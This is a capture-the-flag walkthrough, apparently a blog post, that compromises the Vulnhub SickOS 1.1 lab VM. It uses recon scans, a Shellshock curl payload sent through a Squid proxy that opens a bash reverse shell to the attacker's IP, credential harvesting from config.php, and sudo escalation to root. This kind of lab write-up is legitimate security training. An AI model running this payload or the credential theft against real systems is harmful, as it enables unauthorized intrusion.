# :game_die: Vulnhub Writeup/Walkthrough SickOS 1.1

---

# Vulnhub Writeup/Walkthrough SickOS 1.1 | By Md Amiruddin

This CTF is similar to the labs found in the OSCP exam course. The objective is to compromise the target and gain Administrative/root privileges.

Flags: There is one flag

DHCP : Enabled
IP Address : Automatically assigned

The SickOS 1.1 OVA file can be downloaded [here](https://www.vulnhub.com/entry/sickos-11,132/).

For this Toppo machine, I used Virtual Box to run the target machine. Kali Linux is the attacker machine for solving this CTF.

Footprinting

As you can see the SickOS machine is powered on. Now before we begin use ifconfig to find the IP address of your attack machine (kali) .

My target has an IP address of 10.0.2.9 and my Kali has an IP address of 10.0.2.15. These addresses to apply to me and my network, yours will probably differ.

We will use the command > netdiscover -i eth0 to discover the SickOS ip address.

We next need to the learn about the target that what ports and services are available. For this, we will use Nmap against the target.

Command used > nmap -sS -A -n -T5 10.0.2.9

From the nmap scan we get to know a Squid HTTP Proxy configured on port 3128 and that HTTP running on port 8080 is closed. Presence of HTTP tells us that there is most probably a website.

Let’s look for any vulnerabilities on the web server by configuring Nikto with the proxy.

Command used > nikto -h 10.2.2.9 -useproxy [http://10.0.2.9:3128](http://10.0.2.9:3128)

Nikto scan helps us to identify that the server is vulnerable to the Shellshock vulnerability. You might be wondering that what is shellshock vulnerability.

Shellshock is a computer bug that exploits the vulnerability in the UNIX command execution shell-bash to facilitate hackers to take control of the computer system remotely and execute arbitrary code, which affects UNIX based operating systems, including Linux and Mac OS.

In order to access the website, we will need to configure the proxy settings of our Firefox browser. First of all Launch Firefox and go to Settings>Network Settings>Edit Manual proxy configuration>Ok.

After we click OK and save the proxy settings we can go to the address bar and type in the IP address of the target which wil give us the home page for the website.

You can check the source code of the website but I found nothing useful over there.

After checking robots.txt we get to learn that there is a wolfcms page. Let’s check that out.

Wolfcms page offers nothing useful. Now we will run the exploit Shellshock — [CVE-2014–6271](http://www.cvedetails.com/cve/cve-2014-6271) and [CVE-2014–6278](http://www.cvedetails.com/cve/cve-2014-6278) against this site. It will allow us to establish a reverse shell.

Now open a second terminal and run the following cURL command. Note: this command is configured with my target and Kali IP (10.0.2.15), your IP will probably differ.

Command used > curl -x [http://10.0.2.9:3128](http://10.0.2.9:3128) -H “User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1” [http://10.0.2.9/cgi-bin/status](http://10.0.2.9/cgi-bin/status)

But first Leave set up the listener port up and running.

## Get Md Amiruddin’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Command used: nc -lvnp 4444

As we can see our Reverse shell is established!

Break down of the command:

We used the -x switch to start a connection using our HTTP Proxy. After that we have used the -H switch to include an edited User-Agent header. The code we executed was a reverse TCP bash shell.

We next need to change our default location over to wolfcms folder and then list the contents to see what we can find there.

Command used > cd /var/www/wolfcms

Command used > ls

We found one config.php file so will try to read it. we can view the contents using the cat command.

Command used > cat config.php

This is interesting, we get a user name and password for SQL access.

After that we will use the cat command to print out the contents of the etc/passwd file.

Command used > cat /etc/passwd

We found one username sickos. So, we try to establish a ssh shell using the user sickos and the password we found earlier which is [[email protected]](https://cyberintelligencesolution.com/cdn-cgi/l/email-protection).

Open a second terminal and attempt to login to the target machine using ssh.

Command used > ssh [[email protected]](https://cyberintelligencesolution.com/cdn-cgi/l/email-protection) password : [[email protected]](https://cyberintelligencesolution.com/cdn-cgi/l/email-protection)

As you can see we got successfully logged in. Let’s see what kind of permission sickos has.

Command used: sudo -l

Sickos has root permissions. Let’s access root on the target sickos. After that Change directory over to root.

Command used > sudo su

Command used > cd /root

Let’s list the directory contents and see what permissions that have.

Command used > ls -la

As we found one txt file so to read the contents of the a0216ea4d51874464078c618298b1367.txt file we will use cat command.

Command used > cat a0216ea4d51874464078c618298b1367.txt

And finally we have captured the Flag.

---
